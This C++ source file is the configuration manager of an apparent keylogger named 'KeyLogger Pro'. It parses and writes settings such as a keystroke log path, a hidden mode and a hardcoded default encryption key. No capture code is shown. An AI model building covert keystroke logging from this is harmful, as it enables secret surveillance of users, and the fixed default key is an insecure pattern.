// ============================================================================
// ConfigManager.cpp - Implementação completa
// ============================================================================
#include "ConfigManager.h"
#include "Utils.h"
#include <fstream>
#include <sstream>
#include <iostream>
#include <mutex>
#include <thread>


ConfigManager::ConfigManager(const std::string& configPath) : configFile(configPath) {
    setDefaults();
}

void ConfigManager::setDefaults() {
    config.outputFile = "logs/keylog.txt";
    config.autoSaveInterval = 30;
    config.maxFileSize = 10 * 1024 * 1024; // 10MB
    config.encryptionEnabled = false;
    config.hiddenMode = false;
    config.timestampEnabled = true;
    config.backupEnabled = true;
    config.encryptionKey = "DefaultKey123!@#";
    config.filterSensitiveData = true;
    config.maxLogFiles = 5;
}

bool ConfigManager::loadConfig() {
    std::ifstream file(configFile);
    if (!file.is_open()) {
        std::cout << "Arquivo de config não encontrado, criando com valores padrão..." << std::endl;
        return saveConfig(); // Criar com valores padrão
    }

    return parseConfigFile();
}

bool ConfigManager::parseConfigFile() {
    std::ifstream file(configFile);
    std::string line;
    std::string currentSection;

    while (std::getline(file, line)) {
        line = trim(line);

        // Ignorar comentários e linhas vazias
        if (line.empty() || line[0] == '#' || line[0] == ';') {
            continue;
        }

        // Seções [General], [Security], etc.
        if (line.front() == '[' && line.back() == ']') {
            currentSection = line.substr(1, line.length() - 2);
            continue;
        }

        // Pares chave=valor
        size_t pos = line.find('=');
        if (pos == std::string::npos) continue;

        std::string key = trim(line.substr(0, pos));
        std::string value = trim(line.substr(pos + 1));

        // Processar configurações por seção
        if (currentSection == "General") {
            if (key == "OutputFile") {
                config.outputFile = value;
            } else if (key == "AutoSaveInterval") {
                config.autoSaveInterval = std::stoi(value);
            } else if (key == "MaxFileSize") {
                config.maxFileSize = std::stoul(value);
            } else if (key == "HiddenMode") {
                config.hiddenMode = (Utils::toLower(value) == "true");
            } else if (key == "TimestampEnabled") {
                config.timestampEnabled = (Utils::toLower(value) == "true");
            } else if (key == "BackupEnabled") {
                config.backupEnabled = (Utils::toLower(value) == "true");
            }
        } else if (currentSection == "Security") {
            if (key == "EncryptionEnabled") {
                config.encryptionEnabled = (Utils::toLower(value) == "true");
            } else if (key == "EncryptionKey") {
                config.encryptionKey = value;
            } else if (key == "FilterSensitiveData") {
                config.filterSensitiveData = (Utils::toLower(value) == "true");
            }
        } else if (currentSection == "Advanced") {
            if (key == "MaxLogFiles") {
                config.maxLogFiles = std::stoi(value);
            }
        }
    }

    return true;
}

bool ConfigManager::saveConfig() {
    std::ofstream file(configFile);
    if (!file.is_open()) {
        std::cerr << "Erro: Não foi possível salvar configurações" << std::endl;
        return false;
    }

    file << "# Configurações do KeyLogger Pro\n";
    file << "# Gerado automaticamente\n\n";

    file << "[General]\n";
    file << "OutputFile=" << config.outputFile << "\n";
    file << "AutoSaveInterval=" << config.autoSaveInterval << "\n";
    file << "MaxFileSize=" << config.maxFileSize << "\n";
    file << "HiddenMode=" << (config.hiddenMode ? "true" : "false") << "\n";
    file << "TimestampEnabled=" << (config.timestampEnabled ? "true" : "false") << "\n";
    file << "BackupEnabled=" << (config.backupEnabled ? "true" : "false") << "\n\n";

    file << "[Security]\n";
    file << "EncryptionEnabled=" << (config.encryptionEnabled ? "true" : "false") << "\n";
    file << "EncryptionKey=" << config.encryptionKey << "\n";
    file << "FilterSensitiveData=" << (config.filterSensitiveData ? "true" : "false") << "\n\n";

    file << "[Advanced]\n";
    file << "MaxLogFiles=" << config.maxLogFiles << "\n";

    return true;
}

std::string ConfigManager::trim(const std::string& str) {
    size_t start = str.find_first_not_of(" \t\r\n");
    if (start == std::string::npos) return "";

    size_t end = str.find_last_not_of(" \t\r\n");
    return str.substr(start, end - start + 1);
}